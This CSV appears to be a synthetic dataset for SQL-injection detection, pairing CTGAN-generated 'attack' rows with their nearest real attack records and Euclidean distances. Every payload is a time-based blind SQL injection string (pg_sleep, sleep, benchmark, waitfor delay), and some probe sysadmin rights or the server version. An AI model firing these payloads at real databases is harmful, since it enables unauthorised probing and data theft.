id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000638,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.290727460573223
CTGAN_000639,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,4.472306651982293
CTGAN_000640,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,5.00501591619353
CTGAN_000641,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,8.293373399600512
CTGAN_000642,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,6.78349142481566
CTGAN_000643,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R000121,7.3196095479576835
CTGAN_000644,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,6.215449062265869
CTGAN_000645,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000152,6.812200724030399
CTGAN_000646,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,6.042384979967577
CTGAN_000647,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,6.3820132281032045
CTGAN_000648,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.757631488402166
CTGAN_000649,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,7.371159706959897
CTGAN_000650,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,8.261593624744082
CTGAN_000651,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,5.864516905634321
CTGAN_000652,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,11.40636811986441
CTGAN_000653,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.615638442420539
CTGAN_000654,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.165680083352523
CTGAN_000655,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,9.283205850283908
CTGAN_000656,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,4.953233280414947
CTGAN_000657,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,6.451090588085269
CTGAN_000658,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,4.639778154917603
CTGAN_000659,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,7.880260744443392
CTGAN_000660,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.10391082462949
CTGAN_000661,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,7.31733398283406
CTGAN_000662,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,5.245382466417194
CTGAN_000663,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,6.176163437367397
CTGAN_000664,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.322654354802829
CTGAN_000665,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,6.3499262522346
CTGAN_000666,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,6.1962661998326265
CTGAN_000667,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,5.202450789770494
CTGAN_000668,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000147,6.078928565833199
CTGAN_000669,attack,time,1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000111,9.745907410170538
CTGAN_000670,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.446884673741119
CTGAN_000671,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,6.4749940694275345
CTGAN_000672,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,6.766107174818639
CTGAN_000673,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,5.359985111278657
CTGAN_000674,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,4.976451378818666
CTGAN_000675,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.429053335832479
CTGAN_000676,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,10.295967900825259
CTGAN_000677,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,9.277027213705834
CTGAN_000678,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,9.249313572820885
CTGAN_000679,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,4.63894970531666
CTGAN_000680,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,6.394627948767228
CTGAN_000681,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,7.431513340433651
CTGAN_000682,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,8.075708460741463
CTGAN_000683,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,11.0056817389256
CTGAN_000684,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.473462619450484
CTGAN_000685,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,7.0584213777903155
CTGAN_000686,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,6.7380690019409055
CTGAN_000687,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,6.848280627537364
CTGAN_000688,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,6.191744330548522
CTGAN_000689,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,9.05939927119745
CTGAN_000690,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,8.464712026938647
CTGAN_000691,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,4.812859945913153
CTGAN_000692,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,8.13775781636207
CTGAN_000693,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,6.298050058571232
CTGAN_000694,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.133314259966318
CTGAN_000695,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.117007793531601
CTGAN_000696,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,7.83825270111859
CTGAN_000697,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.439389375942733
CTGAN_000698,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,11.239438161236793
CTGAN_000699,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.992343329274998
CTGAN_000700,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,6.991577144529387
CTGAN_000701,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,3.930410482472217
CTGAN_000702,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,5.879677021172538
CTGAN_000703,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000082,6.841116690082058
CTGAN_000704,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,8.138453797803239
CTGAN_000705,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.624152322630955
CTGAN_000706,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.18012508469511
CTGAN_000707,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.756563025929783
CTGAN_000708,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,5.891806394726365
CTGAN_000709,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,7.073689496606291
CTGAN_000710,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,7.077465396908262
CTGAN_000711,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,7.879665041537427
CTGAN_000712,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,5.631064113720793
CTGAN_000713,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,8.130713328579239
CTGAN_000714,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,7.022165077107361
CTGAN_000715,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,7.226375242139594
CTGAN_000716,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,8.792665791006614
CTGAN_000717,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,6.357520740010134
CTGAN_000718,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,8.099267984441797
CTGAN_000719,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,6.003492903145177
CTGAN_000720,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,7.0812755338577915
CTGAN_000721,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,7.5389718192442325
CTGAN_000722,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,5.748445164955864
CTGAN_000723,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,8.784074300431987
CTGAN_000724,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,7.2015421224817295
CTGAN_000725,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,6.851974593110026
CTGAN_000726,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,6.874341478043448
CTGAN_000727,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.311135581434893
CTGAN_000728,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,5.305330989549448
CTGAN_000729,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,7.5582436849364605
CTGAN_000730,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,7.808007610955417
CTGAN_000731,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,5.507691447953797
CTGAN_000732,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,7.344716752647423
CTGAN_000733,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,6.505211859755604
CTGAN_000734,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,6.592466727121821
CTGAN_000735,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.30180441141463
CTGAN_000736,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,6.808684833911616
CTGAN_000737,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,4.534106349882562
CTGAN_000738,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,8.257373654136341
CTGAN_000739,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,6.362974947542275
CTGAN_000740,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,7.161462416248114
CTGAN_000741,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,6.247991533132652
CTGAN_000742,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,5.46687374633758
CTGAN_000743,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.286826280725358
CTGAN_000744,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,6.495802229892461
CTGAN_000745,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,7.270109504074212
CTGAN_000746,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,14.281255110313001
CTGAN_000747,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000150,8.375428869262262
CTGAN_000748,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,6.522500620179044
CTGAN_000749,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,5.577655675809903
CTGAN_000750,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,6.8404776015430775
CTGAN_000751,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.381492896482245
CTGAN_000752,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,7.687296400588223
CTGAN_000753,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,5.234926834957271
CTGAN_000754,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.995918510538312
CTGAN_000755,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,5.886049675278781
CTGAN_000756,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,nearest_attack_euclidean,R000097,6.873163327456128
CTGAN_000757,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,7.095169393189529
CTGAN_000758,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,8.079402415742818
CTGAN_000759,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,6.635448492694952
CTGAN_000760,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.3951420414184845
CTGAN_000761,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,6.748936041534212
CTGAN_000762,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000140,7.255438764362893
CTGAN_000763,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,5.724602766667819
